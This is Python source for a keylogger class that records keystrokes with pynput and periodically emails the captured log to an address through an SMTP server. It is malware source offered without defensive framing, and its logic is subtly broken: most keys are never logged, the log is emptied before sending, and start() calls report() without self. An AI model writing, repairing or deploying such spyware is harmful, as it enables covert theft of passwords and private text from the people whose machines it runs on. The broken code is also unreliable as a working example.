import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, interval, provider, port, email, password):
        self.log = ""
        self.interval = interval
        self.provider = provider
        self.port = port
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            self.append_to_log(current_key)

    def report(self):
        if len(self.log) > 0:
            self.log = ""
        self.send_mail(self.provider, self.port,
                       self.email, self.password, "\n\n" + self.log)
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, provider, port, email, password, message):
        server = smtplib.SMTP(provider, port)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)

        with keyboard_listener:
            report()
            keyboard_listener.join()
